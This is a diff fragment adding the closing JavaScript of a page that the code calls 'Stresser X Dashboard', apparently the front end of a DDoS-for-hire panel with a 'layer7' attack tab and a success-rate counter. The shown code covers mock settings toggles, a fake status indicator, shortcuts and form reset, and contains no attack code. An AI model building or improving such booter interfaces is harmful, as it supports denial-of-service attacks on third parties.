+                    showMessage('Light theme not implemented yet', false);
+                    _0xa9b0.target.value = 'dark';
+                }
+            });
+
+            // Notification toggle (mock)
+            document.getElementById('notificationToggle')?.addEventListener('change', (_0xc1d2) => {
+                console.log('Notifications set to:', _0xc1d2.target.value);
+            });
+
+            // Language toggle (mock)
+            document.getElementById('languageSelect')?.addEventListener('change', (_0xe3f4) => {
+                console.log('Language set to:', _0xe3f4.target.value);
+            });
+
+            // Mock server status update
+            function mockServerStatus() {
+                const _0xg5h6 = document.getElementById('serverStatus');
+                if (_0xg5h6) {
+                    _0xg5h6.textContent = Math.random() > 0.1 ? 'Operational' : 'Maintenance';
+                    _0xg5h6.previousElementSibling.className = `status-indicator status-${_0xg5h6.textContent.toLowerCase()}`;
+                }
+            }
+            setInterval(mockServerStatus, 30000);
+
+            // Keyboard shortcuts
+            document.addEventListener('keydown', (_0xi7j8) => {
+                if (_0xi7j8.ctrlKey && _0xi7j8.key === 'l') {
+                    document.getElementById('username')?.focus();
+                }
+                if (_0xi7j8.ctrlKey && _0xi7j8.key === 't') {
+                    switchTab('layer7');
+                }
+            });
+
+            // Form reset functionality
+            function resetForms() {
+                document.querySelectorAll('form').forEach(_0xk9l0 => _0xk9l0.reset());
+                showMessage('Formularze zresetowane', true);
+            }
+
+            // Add reset button to settings
+            const settingsContent = document.getElementById('settings');
+            if (settingsContent) {
+                const resetButton = document.createElement('button');
+                resetButton.textContent = 'Reset Settings';
+                resetButton.onclick = resetForms;
+                settingsContent.appendChild(resetButton);
+            }
+
+            // Dynamic success rate
+            function updateSuccessRate() {
+                const _0xm1n2 = document.getElementById('successRate');
+                if (_0xm1n2) {
+                    const rate = _0xk1l2 > 0 ? Math.round(((_0xk1l2 - Math.floor(_0xk1l2 * 0.1)) / _0xk1l2) * 100) : 100;
+                    _0xm1n2.textContent = `${rate}%`;
+                }
+            }
+            setInterval(updateSuccessRate, 10000);
+
+            // Console log for debugging
+            console.log('Stresser X Dashboard loaded successfully');
+        })();
+    </script>
+</body>
+</html>
